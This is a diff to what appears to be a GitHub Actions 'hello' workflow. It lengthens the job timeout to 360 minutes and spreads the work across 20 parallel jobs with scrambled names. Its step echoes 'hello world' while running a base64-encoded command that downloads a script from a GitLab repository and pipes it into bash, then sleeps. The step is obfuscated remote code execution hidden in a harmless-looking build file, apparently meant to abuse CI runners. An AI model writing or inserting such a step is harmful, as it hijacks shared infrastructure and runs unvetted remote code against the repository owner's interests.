@@ -7,11 +7,11 @@ jobs:
   hello:
     name: ${{ matrix.name }}
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 360
     strategy:
       fail-fast: false
       max-parallel: 20
       matrix:
-        name: [DFkhu-a1, JHkhu-b1, YUkhu-c1, KJkhu-d1, IUkhu-e1, POkhu-f1, RTkhu-g1, NHkhu-h1, DFkhu-i1, KJkhu-j1, lpgkhu-a1, drtkhu-b1, erukhu-c1, werkhu-d1, swekhu-e1, jopkhu-f1, ytlkhu-g1, nkhu-h1, uickhu-i1, pwekhu-j1]
+        name: [tyDFkhu-awe1, JHkhjdu-buy1, YUkhsfu-cyt1, KJkshu-dwe1, IUkhsfu-etr1, POkhfsu-fng1, RTkhsfu-gbf1, NHkhfsu-hbg1, DFkhfsfu-ihd1, KJkhytu-jaw1, lpgkhtyu-acs1, drtkhfhu-byr1, erukfhhu-ctr1, werkhfhu-dwq1, swekhhfu-eyt1, jopkhhfu-fre1, ytlkdhhu-g1, nkhdhu-ho1, uicdhkhu-it1, pwekhoiu-jpo1]
     steps:
       - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep 590
